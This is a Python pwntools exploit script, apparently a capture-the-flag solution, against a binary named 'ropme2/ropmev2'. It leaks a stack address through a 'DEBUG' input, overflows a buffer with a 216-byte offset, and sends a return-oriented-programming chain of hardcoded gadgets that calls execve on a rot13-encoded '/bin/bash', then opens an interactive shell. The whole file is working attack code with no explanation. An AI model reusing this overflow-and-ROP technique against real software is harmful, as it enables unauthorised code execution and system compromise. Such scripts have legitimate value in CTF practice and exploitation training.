#!/usr/bin/python3
import codecs

from exploit_template import *

filename = 'ropme2/ropmev2'


def main():

    io = start(filename)
    
    io.sendlineafter('Please dont hack me\n', 'DEBUG')
    data = io.recvline().strip().decode().split('0x')[1]
    leaked_address = int(data, 0x10)
    offset = 216
    bin_sh = codecs.encode('/bin/bash\x00', 'rot_13')
    pop_rax = 0x401162
    pop_rdi = 0x40142b
    padding = (offset - len(bin_sh)) * asm('nop')
    pop_rsi_r15 = 0x401429
    pop_rdx_r13 = 0x401164
    syscall = 0x401168

    payload = flat([
        bin_sh,
        padding,
        pop_rax,
        59,
        pop_rdi,
        leaked_address - 224,
        pop_rsi_r15,
        0,
        0,
        pop_rdx_r13,
        0,
        0,
        syscall
    ])

    info(f'leaked_address: {hex(leaked_address)}')
    io.sendline(payload)
    io.interactive()


if __name__ == '__main__':
    main()
